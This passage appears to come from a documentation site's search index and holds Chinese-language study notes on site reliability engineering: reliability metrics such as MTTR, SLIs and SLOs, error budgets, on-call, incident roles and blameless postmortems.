<p>\u8fd9\u91cc\u7684\u6280\u672f\u8fd0\u8425\u5de5\u4f5c\uff0c\u662fPE\u804c\u8d23\u975e\u5e38\u5927\u7684\u8f6c\u53d8\uff0c\u56e0\u4e3a\u968f\u7740\u5404\u7c7b\u5e73\u53f0\u7684\u5b8c\u5584\uff0c\u5f88\u591a\u539f\u6765\u4f9d\u8d56\u8fd0\u7ef4\u5b8c\u6210\u7684\u4e8b\u60c5\uff0c\u4e1a\u52a1\u5f00\u53d1\u5b8c\u5168\u53ef\u4ee5\u4f9d\u8d56\u5e73\u53f0\u81ea\u4e3b\u5b8c\u6210\uff0c\u65e0\u9700\u8fd0\u7ef4\u4ecb\u5165\u3002\u6bd4\u5982\u4ee3\u7801\u53d1\u5e03\u3001\u914d\u7f6e\u53d8\u66f4\uff0c\u751a\u81f3\u662f\u8d44\u6e90\u7533\u8bf7\u3002</p> <p>\u6240\u4ee5\uff0c\u8fd9\u65f6\u6211\u4eec\u4f1a\u66f4\u5f3a\u8c03PE\u4ece\u5168\u5c40\u89d2\u5ea6\u5173\u6ce8\u7cfb\u7edf\uff0c\u9664\u4e86\u7a33\u5b9a\u6027\uff0c\u8fd8\u53ef\u4ee5\u5173\u6ce8\u8d44\u6e90\u6d88\u8017\u7684\u6210\u672c\u6570\u636e\uff0c\u5728\u7a33\u5b9a\u548c\u6548\u7387\u90fd\u6709\u4fdd\u8bc1\u7684\u524d\u63d0\u4e0b\uff0c\u4e5f\u80fd\u591f\u505a\u5230\u6210\u672c\u7684\u4e0d\u65ad\u4f18\u5316\u3002\u8fd9\u6837\u4e5f\u4f1a\u4f7f\u5f97PE\u4ece\u539f\u6709\u7e41\u7410\u7684\u4e8b\u52a1\u4e2d\u62bd\u79bb\u51fa\u6765\uff0c\u80fd\u591f\u53bb\u505a\u66f4\u6709\u4ef7\u503c\u7684\u4e8b\u60c5\u3002\u5173\u4e8e\u8fd9\u4e00\u70b9\uff0c\u4e5f\u662f\u7ed9\u8fd0\u7ef4\u540c\u5b66\u4e00\u4e2a\u8f6c\u578b\u548c\u63d0\u5347\u7684\u5efa\u8bae\u3002</p>"},{"location":"ops/50-sre-mogu-10/#_7","title":"\u603b\u7ed3","text":"<p>\u597d\u4e86\uff0c\u6211\u4eec\u505a\u4e0b\u672c\u8282\u8bfe\u7684\u603b\u7ed3\u3002</p> <p>\u6211\u4eec\u501f\u52a9\u5927\u4fc3\u8fd9\u6837\u7684\u573a\u666f\uff0c\u901a\u8fc7\u201c\u4ee5\u8d5b\u5e26\u7ec3\u201d\u7684\u601d\u8def\u6765\u9a71\u52a8\u7a33\u5b9a\u6027\u4f53\u7cfb\u7684\u5efa\u8bbe\u548c\u63d0\u5347\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0cPE\u66f4\u52a0\u5173\u6ce8\u5168\u5c40\u548c\u7cfb\u7edf\u5c42\u9762\u7684\u7a33\u5b9a\u6027\uff0c\u5e76\u63d0\u4f9b\u5404\u7c7b\u751f\u4ea7\u73af\u5883\u7684\u8fd0\u884c\u6570\u636e\uff1b\u800c\u4e1a\u52a1\u5f00\u53d1\u5219\u4f1a\u66f4\u5173\u6ce8\u4e1a\u52a1\u4ee3\u7801\u548c\u903b\u8f91\u5c42\u9762\u7684\u7a33\u5b9a\u6027\uff0c\u4e0ePE\u4e92\u8865\u4e14\u76f8\u4e92\u4f9d\u8d56\uff1b\u800c\u7a33\u5b9a\u6027\u548c\u5de5\u5177\u5f00\u53d1\u63d0\u4f9b\u5e73\u53f0\u548c\u5de5\u5177\u652f\u6491\uff0c\u4fdd\u969c\u6bcf\u4e00\u4e2a\u73af\u8282\u66f4\u52a0\u9ad8\u6548\u5730\u5b8c\u6210\u3002\u6700\u540e\uff0c\u6211\u4eec\u8fd8\u4f1a\u5c06\u8fd9\u4e9b\u5de5\u4f5c\u4f8b\u884c\u5316\uff0c\u8f6c\u5316\u6210\u65e5\u5e38\u7684\u7a33\u5b9a\u6027\u4fdd\u969c\u4e8b\u9879\u3002</p>"},{"location":"ops/50-sre-mogu/","title":"SRE\u5b9e\u6218","text":"<p>\u6458\u5f55\u4e8e\u8611\u83c7\u8857\u8d75\u6210\u7684\u5206\u4eab\u300aSRE \u5b9e\u6218\u624b\u518c\u300b\u300a\u8fd0\u7ef4\u4f53\u7cfb\u7ba1\u7406\u300b\u3002</p> SRE\u5e38\u89c1\u95ee\u9898\u4e0e\u56f0\u60d1\uff1f <ul> <li>SRE\u5230\u5e95\u662f\u4ec0\u4e48\uff1f\u5230\u5e95\u80fd\u5e2e\u6211\u4eec\u89e3\u51b3\u4ec0\u4e48\u95ee\u9898\uff1f</li> <li>\u7c7b\u4f3c\u7684\u65b9\u6cd5\u8bba\u8fd8\u6709DevOps\u3001AIOps\uff0c\u4ee5\u53ca\u6700\u65b0\u7684\u6df7\u6c8c\u5de5\u7a0b\uff08Chaos Engineering\uff09\uff0c\u5b83\u4eec\u4e4b\u95f4\u6709\u4ec0\u4e48\u533a\u522b\uff1f</li> <li>SRE\u6d89\u53ca\u8303\u56f4\u5982\u6b64\u4e4b\u5927\uff0c\u6211\u4eec\u5230\u5e95\u5e94\u8be5\u4ece\u54ea\u91cc\u5165\u624b\u5efa\u8bbe\u5462\uff1f</li> <li>\u5728\u7a33\u5b9a\u6027\u6280\u672f\u4f53\u7cfb\u7684\u5efa\u8bbe\u4e0a\uff0c\u6211\u4eec\u505a\u4e86\u5927\u91cf\u5de5\u4f5c\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u662f\u6545\u969c\u9891\u53d1\u3001\u9891\u9891\u6551\u706b\uff1f\u96be\u9053\u5355\u7eaf\u7684\u6280\u672f\u4fdd\u969c\u8fd8\u4e0d\u591f\u5417\uff1f</li> <li>\u6bcf\u6b21\u51fa\u6545\u969c\uff0c\u6211\u4eec\u90fd\u89c9\u5f97\u54cd\u5e94\u901f\u5ea6\u548c\u5904\u7406\u6548\u7387\u5df2\u7ecf\u5f88\u9ad8\u4e86\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48\u4e1a\u52a1\u90e8\u95e8\u548c\u9886\u5bfc\u4ecd\u7136\u4e0d\u6ee1\u610f\uff0c\u603b\u662f\u6307\u8d23\u6211\u4eec\u5f00\u53d1\u548c\u7ef4\u62a4\u7684\u7cfb\u7edf\u4e0d\u7a33\u5b9a\uff1f</li> <li>\u6bcf\u6b21\u6545\u969c\u4e4b\u540e\uff0c\u6700\u5bb3\u6015\u7684\u5c31\u662f\u5f00\u590d\u76d8\u4f1a\uff0c\u5f00\u7740\u5f00\u7740\u5c31\u53d8\u6210\u4e86\u6279\u6597\u4f1a\uff0c\u6709\u65f6\u5019\u95ee\u9898\u8fd8\u6ca1\u5b9a\u4f4d\u6e05\u695a\uff0c\u5c31\u5f00\u59cb\u63a8\u8bff\u626f\u76ae\u8c01\u5e94\u8be5\u80cc\u9505\u4e86\uff0c\u771f\u4e0d\u77e5\u9053\u5f00\u6545\u969c\u590d\u76d8\u4f1a\u7684\u76ee\u7684\u662f\u4ec0\u4e48\uff1f</li> <li>\u5f15\u5165\u4e86SRE\uff0c\u6211\u4eec\u56e2\u961f\u7684\u80fd\u529b\u5e94\u8be5\u600e\u4e48\u63d0\u5347\uff1f\u7ec4\u7ec7\u67b6\u6784\u5e94\u8be5\u600e\u4e48\u5339\u914d\u5462\uff1f</li> <li>SRE\u7684\u8981\u6c42\u8fd9\u4e48\u9ad8\uff0c\u4f5c\u4e3a\u4e2a\u4eba\uff0c\u6211\u5e94\u8be5\u5982\u4f55\u63d0\u5347\u81ea\u5df1\u7684\u80fd\u529b\u8fbe\u5230SRE\u7684\u8981\u6c42\uff1f</li> <li>SRE\u65e0\u6240\u4e0d\u80fd\u7684\u89d2\u8272\uff1f\u8fd8\u662f\u8fd0\u7ef4\u8fd0\u7ef4\u7684\u5347\u7ea7\uff1f</li> <li>\u6ca1\u6709\u6545\u969c\uff0c\u7cfb\u7edf\u5c31\u4e00\u5b9a\u662f\u7a33\u5b9a\u7684\u5417\uff1f</li> </ul> <p>\u4ee5\u4e0b\u4e3a\u4e2a\u4eba\u6d88\u5316\u7406\u89e3\u540e\u7684\u7b14\u8bb0\u3002</p>"},{"location":"ops/50-sre-mogu/#_1","title":"\u4e00\u3001\u592f\u5b9e\u57fa\u7840","text":"<p>\u7a33\u5b9a\u6027\u7684\u6807\u51c6\u3002</p>"},{"location":"ops/50-sre-mogu/#11","title":"1.1 \u7edf\u4e00\u5171\u8bc6","text":"<p>\u672f\u8bed</p> <ul> <li> <p>MTBF\uff0cMean Time Between Failure\uff0c\u5e73\u5747\u6545\u969c\u65f6\u95f4\u95f4\u9694\u3002</p> </li> <li> <p>MTTR\uff0cMean Time To Repair\uff0c\u6545\u969c\u5e73\u5747\u4fee\u590d\u65f6\u95f4\u3002</p> </li> <li> <p>MTTI\uff0cMean Time To Identify\uff0c\u5e73\u5747\u6545\u969c\u53d1\u73b0\u65f6\u95f4\u3002</p> </li> <li> <p>MTTK\uff0cMean Time To Know\uff0c\u5e73\u5747\u6545\u969c\u8ba4\u77e5\u65f6\u95f4\u3002</p> </li> <li> <p>MTTF\uff0cMean Time To Fix\uff0c\u5e73\u5747\u6545\u969c\u89e3\u51b3\u65f6\u95f4\u3002</p> </li> <li> <p>MTTV\uff0cMean Time To Verify\uff0c\u5e73\u5747\u6545\u969c\u4fee\u590d\u9a8c\u8bc1\u65f6\u95f4\u3002</p> </li> </ul>"},{"location":"ops/50-sre-mogu/#12","title":"1.2 \u8861\u91cf\u6807\u51c6","text":""},{"location":"ops/50-sre-mogu/#121","title":"1.2.1 \u8861\u91cf\u65b9\u5f0f","text":"<p>\u4e1a\u52a1\u8861\u91cf\u7cfb\u7edf\u53ef\u7528\u6027\u7684\u4e24\u79cd\u65b9\u5f0f\uff1a</p> <ul> <li>\u65f6\u95f4\u7eac\u5ea6\uff1aAvailability = Uptime / (Uptime + Downtime)\u3002</li> <li>\u8bf7\u6c42\u7eac\u5ea6\uff1aAvailability = Successful request / Total request\u3002</li> </ul> <p></p> \u65f6\u95f4\u7eac\u5ea6\u4e09\u8981\u7d20\u8bf7\u6c42\u7eac\u5ea6\u4e09\u8981\u7d20 <ol> <li>\u8861\u91cf\u6307\u6807\uff0c\u5982\u7cfb\u7edf\u8bf7\u6c42\u72b6\u6001\u7801\u3002</li> <li>\u8861\u91cf\u76ee\u6807\uff0c\u5982\u975e5xx\u5360\u6bd4\u6210\u529f\u7387\u8fbe\u523095%\u3002</li> <li>\u6301\u7eed\u65f6\u957f\uff0c\u6301\u7eed10\u5206\u949f\u3002</li> </ol> <ol> <li>\u8861\u91cf\u6307\u6807</li> <li>\u8861\u91cf\u76ee\u6807</li> <li>\u7edf\u8ba1\u5468\u671f</li> </ol> <p>\u6545\u969c\u4e00\u5b9a\u610f\u5473\u7740\u4e0d\u7a33\u5b9a\uff0c\u4f46\u662f\u4e0d\u7a33\u5b9a\uff0c\u5e76\u4e0d\u610f\u5473\u7740\u4e00\u5b9a\u6709\u6545\u969c\u53d1\u751f\u3002</p>"},{"location":"ops/50-sre-mogu/#122","title":"1.2.2 \u8bc4\u4f30\u56e0\u7d20","text":"<p>\u4e09\u56e0\u7d20</p> <ol> <li>\u6210\u672c\u56e0\u7d20\uff0cROI \u6295\u5165\u4ea7\u51fa\u6bd4\uff0c\u7a33\u5b9a\u6027\u8981\u6c42\u8d8a\u9ad8\u6295\u5165\u4f1a\u8d8a\u5927\u3002</li> <li>\u4e1a\u52a1\u5bb9\u5fcd\u5ea6\uff0c\u6838\u5fc3\u7cfb\u7edf\u4f18\u5148\u4fdd\u969c\uff0c\u975e\u6838\u5fc3\u7cfb\u7edf\u4e0d\u5f71\u54cd\u4e3b\u4e1a\u52a1\u6d41\u7a0b\u3002</li> <li>\u7cfb\u7edf\u5f53\u524d\u7684\u7a33\u5b9a\u72b6\u51b5\uff0c\u5b9a\u4e00\u4e2a\u5408\u7406\u7684\u6807\u51c6\u6bd4\u5b9a\u4e00\u4e2a\u66f4\u9ad8\u7684\u6807\u51c6\u4f1a\u66f4\u91cd\u8981\u3002</li> </ol> <p>SRE\u5173\u6ce8\u7684\u7a33\u5b9a\u6027\u662f\u7cfb\u7edf\u7684\u6574\u4f53\u8fd0\u884c\u72b6\u6001\uff0c\u800c\u4e0d\u4ec5\u4ec5\u53ea\u5173\u6ce8\u6545\u969c\u72b6\u6001\u4e0b\u7684\u7a33\u5b9a\u6027\uff0c\u5728\u7cfb\u7edf\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u7684\u4efb\u4f55\u5f02\u5e38\uff0c\u90fd\u4f1a\u88ab\u7eb3\u5165\u7a33\u5b9a\u6027\u7684\u8bc4\u4f30\u8303\u7574\u4e2d\u3002</p>"},{"location":"ops/50-sre-mogu/#123","title":"1.2.3 \u8bbe\u5b9a\u8fc7\u7a0b","text":"<p>\u672f\u8bed</p> <ul> <li>SLI\uff0cService Level Indicator\u3002\u5982\u72b6\u6001\u7801\u4e3a\u975e5xx\u7684\u6bd4\u4f8b\u3002</li> <li>SLO\uff0cService Level Objective\u3002\u5982\u5927\u4e8e\u7b49\u4e8e99.95%\u3002</li> </ul> <p>SLO\u662fSLI\u8981\u8fbe\u6210\u7684\u76ee\u6807\u3002</p> <p></p> <p>\u5408\u7406\u5bf9\u6307\u6807\u5206\u5c42\uff0c\u4e0d\u662f\u6240\u6709\u6307\u6807\u90fd\u662f\u9002\u5408\u505aSLI\u6307\u6807\u3002</p> <p>\u9009\u62e9SLI\u7684\u4e24\u5927\u539f\u5219</p> <ol> <li>\u9009\u62e9\u80fd\u591f\u6807\u8bc6\u4e00\u4e2a\u4e3b\u4f53\u662f\u5426\u7a33\u5b9a\u7684\u6307\u6807\uff0c\u5982\u679c\u4e0d\u662f\u8fd9\u4e2a\u4e3b\u4f53\u672c\u8eab\u7684\u6307\u6807\uff0c\u6216\u8005\u4e0d\u80fd\u6807\u8bc6\u4e3b\u4f53\u7a33\u5b9a\u6027\u7684\uff0c\u5c31\u8981\u6392\u9664\u5728\u5916\u3002</li> <li>\u9488\u5bf9\u7535\u5546\u7c7b\u6709\u7528\u6237\u754c\u9762\u7684\u4e1a\u52a1\u7cfb\u7edf\uff0c\u4f18\u5148\u9009\u62e9\u4e0e\u7528\u6237\u4f53\u9a8c\u5f3a\u76f8\u5173\u6216\u7528\u6237\u53ef\u4ee5\u660e\u663e\u611f\u77e5\u7684\u6307\u6807\u3002</li> </ol> <p>\u5feb\u901f\u8bc6\u522bSLI\u6307\u6807\u7684\u65b9\u6cd5\uff1aGoogle - VALET\u3002</p> <ul> <li>V - Volume\uff0c\u5bb9\u91cf\u3002</li> <li>A - Availablity\uff0c\u53ef\u7528\u6027\u3002</li> <li>L - Latency\uff0c\u65f6\u5ef6\u3002\u9700\u8981\u5408\u7406\u7f6e\u4fe1\u533a\u95f4\u3002</li> <li>E - Errors\uff0c\u9519\u8bef\u7387\u3002</li> <li>T - Tickets\uff0c\u4eba\u5de5\u4ecb\u5165\u3002\u4f4e\u6548\u73b0\u8c61\u3002</li> </ul> <p></p> <p>SLO\u8ba1\u7b97\u53ef\u7528\u6027</p> <ul> <li>\u76f4\u63a5\u6839\u636e\u6210\u529f\u7684\u5b9a\u4e49\u8ba1\u7b97\uff0cSuccessful = \uff08\u72b6\u6001\u7801\u975e5xx\uff09&amp;\uff08\u65f6\u5ef6 &lt;= 80ms \u3002\u5e38\u7528\u5728SLA\u3002</li> <li>SLO\u65b9\u6cd5\u8ba1\u7b97\uff0cAvailability = SLO1 &amp; SLO2 &amp; SLO3\u3002</li> <li>SLO1\uff0c99.95%\u72b6\u6001\u7801\u6210\u529f\u7387</li> <li>SLO2\uff0c90% Latency &lt;=80ms</li> <li>SLO3\uff0c99% Latency &lt;=200ms</li> </ul> <p>Reference</p>"},{"location":"ops/50-sre-mogu/#124-error-budget","title":"1.2.4 Error Budget","text":"<p>\u5e94\u7528\u573a\u666f</p> <ul> <li>\u7a33\u5b9a\u6027\u71c3\u5c3d\u56fe</li> <li>\u6545\u969c\u5b9a\u7ea7</li> <li>\u7a33\u5b9a\u6027\u5171\u8bc6\u673a\u5236</li> <li>\u57fa\u4e8e\u9519\u8bef\u9884\u7b97\u7684\u544a\u8b66</li> </ul> <p></p> <p></p> <p>\u544a\u8b66\u5e94\u8be5\u662f\u5177\u6709\u6307\u5bfc\u610f\u4e49\u3002</p> <p>SLO\u662f\u9700\u8981\u4e0d\u65ad\u6821\u51c6\u7684</p> \u6838\u51c6\u60c5\u51b5 SLO\u5b8c\u6210\u5ea6 \u4eba\u5de5\u6295\u5165\u5ea6 \u7528\u6237\u6ee1\u610f\u5ea6 \u6536\u7d27SLO Met Low/High Low \u653e\u5bbdSLO Missed Low/High High \u4fdd\u6301\u73b0\u72b6 Met Low High <p>\u5728SLO\u53ef\u4ee5\u8fbe\u6210\u7684\u60c5\u51b5\u4e0b\uff0c\u5c3d\u6700\u5927\u5316\u63d0\u5347\u7528\u6237\u4ef7\u503c\u4ea4\u4ed8\u6548\u7387\uff0c\u56f4\u7ed5\u8fd9\u4e2a\u7ec8\u6781\u76ee\u6807\u4e0d\u65ad\u4f18\u5316\u81ea\u5df1\u7684SLO\u548c\u9519\u8bef\u9884\u7b97\u7b56\u7565\u3002</p> <p>\u5173\u952e\u5185\u5bb9</p> <ul> <li>\u9519\u8bef\u9884\u7b97\u662f\u901a\u8fc7SLO\u63a8\u5bfc\u51fa\u6765\u7684\uff0c\u4e3a\u4e86\u8fbe\u6210SLO\uff0c\u5c31\u8981\u5c3d\u91cf\u51cf\u5c11\u5bf9\u5b83\u7684\u6d88\u8017\u3002</li> <li>\u9519\u8bef\u9884\u7b97\u7684\u8b66\u793a\u6548\u679c\u66f4\u663e\u8457\uff0c\u6240\u4ee5\u6211\u4eec\u901a\u5e38\u56f4\u7ed5\u5b83\u6765\u5f00\u5c55\u7a33\u5b9a\u6027\u4fdd\u969c\u5de5\u4f5c\u3002\u843d\u5730\u9519\u8bef\u9884\u7b97\u53ef\u4ee5\u9075\u5faa\u4e00\u4e9b\u57fa\u672c\u539f\u5219\uff0c\u6bd4\u5982\u8981\u5bf9\u7cfb\u7edf\u6545\u969c\u6216\u95ee\u9898\u6709\u5bb9\u5fcd\u5ea6\uff0c\u5728\u9884\u7b97\u6d88\u8017\u8fc7\u5feb\u6216\u6d88\u8017\u6b86\u5c3d\u4e4b\u524d\uff0cSRE\u6709\u6743\u8e29\u8e29\u201d\u5239\u8f66\u201c\uff0c\u51cf\u5c11\u6216\u62d2\u7edd\u7ebf\u4e0a\u53d8\u66f4\u7b49\u7b49\uff0c\u8fd9\u4e9b\u7b56\u7565\u8981\u81ea\u4e0a\u800c\u4e0b\u8fbe\u6210\u5171\u8bc6\u3002</li> <li>SLO\u548c\u9519\u8bef\u9884\u7b97\u662f\u5426\u5408\u7406\uff0c\u57fa\u4e8e\u5b83\u4eec\u7684\u7b56\u7565\u662f\u5426\u6709\u6548\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7SLO\u8fbe\u6210\u60c5\u51b5\u3001\u4eba\u8089\u6295\u5165\u7a0b\u5ea6\u548c\u7528\u6237\u6ee1\u610f\u5ea6\u4e09\u4e2a\u7ef4\u5ea6\u8fdb\u884c\u8bc4\u4f30\uff0c\u8fdb\u800c\u8c03\u6574\u548c\u4f18\u5316\u5b83\u4eec\u3002</li> </ul>"},{"location":"ops/50-sre-mogu/#125-slo","title":"1.2.5 SLO\u539f\u5219","text":"<p>\u56db\u539f\u5219</p> <ol> <li>\u6838\u5fc3\u5e94\u7528\u7684SLO\u8981\u66f4\u4e25\u683c\uff0c\u975e\u6838\u5fc3\u5e94\u7528\u53ef\u4ee5\u653e\u5bbd\u3002</li> <li>\u5f3a\u4f9d\u8d56\u4e4b\u95f4\u7684\u6838\u5fc3\u5e94\u7528\uff0cSLO\u8981\u4e00\u81f4\u3002</li> <li>\u5f31\u4f9d\u8d56\u4e2d\uff0c\u6838\u5fc3\u5e94\u7528\u5bf9\u975e\u6838\u5fc3\u7684\u4f9d\u8d56\uff0c\u8981\u6709\u964d\u7ea7\u3001\u7194\u65ad\u548c\u9650\u6d41\u7b49\u670d\u52a1\u6cbb\u7406\u624b\u6bb5\u3002</li> <li>Error budget\u7b56\u7565\uff0c\u6838\u5fc3\u5e94\u7528\u7684\u9519\u8bef\u9884\u7b97\u8981\u5171\u4eab\uff0c\u5c31\u662f\u5982\u4f55\u67d0\u4e2a\u6838\u5fc3\u5e94\u7528\u9519\u8bef\u9884\u7b97\u6d88\u8017\u5b8c\uff0cSLO\u6ca1\u6709\u8fbe\u6210\uff0c\u90a3\u6574\u6761\u94fe\u8def\u539f\u5219\u4e0a\u662f\u8981\u5168\u90e8\u6682\u505c\u64cd\u4f5c\u7684\u3002</li> </ol>"},{"location":"ops/50-sre-mogu/#126-slo","title":"1.2.6 \u9a8c\u8bc1SLO","text":"<p>\u4e24\u79cd\u624b\u6bb5</p> <ol> <li>\u5bb9\u91cf\u538b\u6d4b</li> <li>\u6df7\u6c8c\u5de5\u7a0b\uff08Chaos Engineering\uff09</li> </ol> <p>\u6df7\u6c8c\u5de5\u7a0b\u662fSRE\u7a33\u5b9a\u6027\u5efa\u8bbe\u7684\u9ad8\u7ea7\u9636\u6bb5\uff0c\u4e00\u5b9a\u662fSRE\u4f53\u7cfb\u5728\u670d\u52a1\u6cbb\u7406\u3001\u5bb9\u91cf\u538b\u6d4b\u3001\u94fe\u8def\u8ddf\u8e2a\u3001\u76d1\u63a7\u544a\u8b66\u3001\u8fd0\u7ef4\u81ea\u52a8\u5316\u7b49\u76f8\u5bf9\u57fa\u7840\u548c\u5fc5\u9700\u7684\u90e8\u5206\u975e\u5e38\u5b8c\u5584\u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u8003\u8651\u7684\u3002</p>"},{"location":"ops/50-sre-mogu/#127","title":"1.2.7 \u9a8c\u6536\u65f6\u673a","text":"<p>\u53c2\u8003Google\u5efa\u8bae</p> <ul> <li>\u9519\u8bef\u9884\u7b97\u5145\u8db3</li> <li>\u8bc4\u4f30\u6a21\u62df\u5f71\u54cd</li> </ul> <p>\u751f\u4ea7\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u5728\u4efb\u4f55\u65f6\u5019\u90fd\u662f\u6700\u9ad8\u4f18\u5148\u7ea7\u8981\u4fdd\u8bc1\u7684\uff0c\u51b3\u4e0d\u80fd\u56e0\u4e3a\u6f14\u7ec3\u5bfc\u81f4\u7cfb\u7edf\u5f02\u5e38\u6216\u6545\u969c\uff0c\u8fd9\u4e5f\u662f\u4e0d\u88ab\u5141\u8bb8\u7684\u3002\u6240\u4ee5\u4e00\u5b9a\u8981\u9009\u62e9\u5408\u9002\u7684\u65f6\u673a\uff0c\u5728\u6709\u5145\u5206\u51c6\u5907\u548c\u9884\u6848\u7684\u60c5\u51b5\u4e0b\u5b9e\u65bd\u5404\u7c7b\u9a8c\u8bc1\u5de5\u4f5c\u3002</p>"},{"location":"ops/50-sre-mogu/#_2","title":"\u4e8c\u3001\u6700\u4f73\u5b9e\u8df5","text":"<p>\u5904\u7406\u6545\u969c\u548c\u7ec4\u7ec7\u67b6\u6784\u3002</p>"},{"location":"ops/50-sre-mogu/#21","title":"2.1 \u53d1\u73b0\u6545\u969c","text":"<p>\u6545\u969c\u4fee\u590d\u6d41\u7a0b\uff1aMTTI \u2192 MTTK \u2192 MTTF \u2192 MTTV</p> <p>\u6309\u7ecf\u9a8c\u6545\u969c\u4fee\u590d\u8fc7\u7a0b\u65f6\u95f4\u4ece\u591a\u5230\u5c11\uff1a MTTK &gt; MTTI &gt; MTTF &gt; MTTV</p> <p>\u5f53\u6545\u969c\u53d1\u751f\u65f6</p> <ul> <li>\u5224\u65ad\u51fa\u73b0\u7684\u95ee\u9898\u662f\u4e0d\u662f\u6545\u969c</li> <li>\u786e\u5b9a\u7531\u8c01\u6765\u54cd\u5e94\u548c\u53ec\u96c6</li> </ul>"},{"location":"ops/50-sre-mogu/#211-on-call","title":"2.1.1 On-Call","text":"<p>\u6267\u884cOn-Call</p> <ul> <li>\u7a33\u5b9a\u6027SLO\u544a\u8b66\u9ad8\u4e8e\u4e00\u822c\u544a\u8b66</li> <li>\u65e0\u7a33\u5b9a\u6027SLO\u544a\u8b66\u65f6\u964d\u4f4e\u4e00\u822c\u544a\u8b66\u7684\u54cd\u5e94\u7ea7\u522b</li> <li>\u786e\u4fdd\u5173\u952e\u89d2\u8272\u5fc5\u987b\u5728\u7ebf\u968f\u65f6\u5e94\u6025\u54cd\u5e94</li> </ul> <p>On-Call\u6d41\u7a0b\u4e94\u6b65\u6cd5</p> <ol> <li>\u786e\u4fdd\u5173\u952e\u89d2\u8272\u5728\u7ebf</li> <li>\u7ec4\u7ec7War Room\u5e94\u6025\u7ec4\u7ec7</li> <li>\u5efa\u7acb\u5408\u7406\u7684\u547c\u53eb\u65b9\u5f0f</li> <li>\u786e\u4fdd\u8d44\u6e90\u6295\u5165\u7684\u5347\u7ea7\u673a\u5236</li> <li>\u4e0e\u4e91\u5382\u5546\u8054\u5408\u7684On-Call</li> </ol> <p>\u719f\u6089\u67d0\u4e2a\u7cfb\u7edf\u7684\u6700\u5feb\u6700\u597d\u7684\u65b9\u5f0f\u5c31\u662f\u53c2\u4e0eOn-Call\uff0c\u800c\u4e0d\u662f\u770b\u67b6\u6784\u56fe\u548c\u4ee3\u7801\u3002</p>"},{"location":"ops/50-sre-mogu/#22","title":"2.2 \u5904\u7406\u6545\u969c","text":"<p>\u5728\u6545\u969c\u5904\u7406\u8fc7\u7a0b\u4e2d\u91c7\u53d6\u7684\u6240\u6709\u7684\u624b\u6bb5\u548c\u884c\u52a8\uff0c\u4e00\u5207\u4ee5\u6062\u590d\u4e1a\u52a1\u4e3a\u6700\u9ad8\u4f18\u5148\u7ea7\u3002</p>"},{"location":"ops/50-sre-mogu/#221","title":"2.2.1 \u6545\u969c\u7ba1\u7406","text":"<p>\u6545\u969c\u53d1\u751f\u548c\u6301\u7eed\u8513\u5ef6\u4e09\u4e2a\u539f\u56e0</p> <ol> <li>\u6545\u969c\u9694\u79bb\u624b\u6bb5\u7f3a\u5931\uff1a\u9650\u6d41\u3001\u964d\u7ea7\u548c\u7194\u65ad\uff0cDesign-For-Failure\u9ad8\u53ef\u7528\u8bbe\u8ba1\u3002</li> <li>\u5173\u952e\u89d2\u8272\u548c\u6d41\u7a0b\u673a\u5236\u7f3a\u5931\uff1a\u660e\u786e\u5206\u5de5\u3001\u5173\u952e\u89d2\u8272\u3001\u5171\u540c\u51b3\u7b56\u548c\u53cd\u9988\u901a\u62a5\u3002</li> <li>\u6ca1\u6709\u6f14\u7ec3</li> </ol>"},{"location":"ops/50-sre-mogu/#222","title":"2.2.2 \u6709\u6548\u673a\u5236","text":"<p>\u5173\u952e\u89d2\u8272\u5206\u5de5</p> <ul> <li>IC - Incident Commander \u6545\u969c\u6307\u6325\u5b98</li> <li>CL - Communication Lead \u6c9f\u901a\u5f15\u5bfc</li> <li>OL - Operations Lead \u8fd0\u7ef4\u6307\u6325</li> <li>IR - Incident Responders \u6267\u884c\u4eba\u5458</li> </ul> <p>\u9ad8\u6548\u7684\u6d41\u7a0b\u673a\u5236</p> <p>\u6709\u6548\u7684\u53cd\u9988\u673a\u5236</p> <ul> <li>\u56fa\u5b9a\u65f6\u95f4\u53cd\u9988\uff1a10-15\u5206\u949f</li> <li>\u6ca1\u6709\u8fdb\u5c55\u4e5f\u8981\u53cd\u9988</li> </ul>"},{"location":"ops/50-sre-mogu/#23","title":"2.3 \u590d\u76d8\u6545\u969c","text":"<p>\u4ece\u6545\u969c\u4e2d\u5b66\u4e60\u548c\u63d0\u5347\u3002</p>"},{"location":"ops/50-sre-mogu/#231","title":"2.3.1 \u590d\u76d8\u524d\u63d0","text":"<ul> <li>\u65e8\u5728\u6539\u8fdb\uff0c\u89c4\u907f\u95ee\u9898\uff0c\u4e0d\u662f\u8ffd\u8d23</li> <li>\u7ed3\u5408Timeline\uff1a\u89e3\u51b3\u56db\u8fc7\u7a0b\u65f6\u95f4\u6d88\u8017\u5206\u5e03</li> <li>\u8ddf\u8fdb\u540e\u7eed\u6539\u8fdb\u6548\u679c</li> </ul>"},{"location":"ops/50-sre-mogu/#232","title":"2.3.2 \u9ec4\u91d1\u4e09\u95ee","text":"<ul> <li> <p>\u6545\u969c\u539f\u56e0\u6709\u54ea\u4e9b\uff1f</p> </li> <li> <p>\u6211\u4eec\u505a\u4ec0\u4e48\uff0c\u600e\u4e48\u505a\u624d\u80fd\u786e\u4fdd\u4e0b\u6b21\u4e0d\u4f1a\u518d\u51fa\u73b0\u7c7b\u4f3c\u6545\u969c\uff1f</p> </li> <li> <p>\u5f53\u65f6\u5982\u679c\u6211\u4eec\u505a\u4e86\u4ec0\u4e48\uff0c\u53ef\u4ee5\u7528\u66f4\u77ed\u7684\u65f6\u95f4\u6062\u590d\u4e1a\u52a1\uff1f</p> </li> </ul>"},{"location":"ops/50-sre-mogu/#233","title":"2.3.3 \u5224\u5b9a\u539f\u5219","text":"<ul> <li>\u5065\u58ee\u6027\u539f\u5219</li> <li>\u7b2c\u4e09\u65b9\u9ed8\u8ba4\u65e0\u8d23</li> <li>\u5206\u9636\u6bb5\u539f\u5219</li> </ul> <p>\u6545\u969c\u662f\u7cfb\u7edf\u8fd0\u884c\u5e38\u6001\uff0c\u6b63\u5e38\u624d\u662f\u7279\u6b8a\u72b6\u6001\u3002</p> 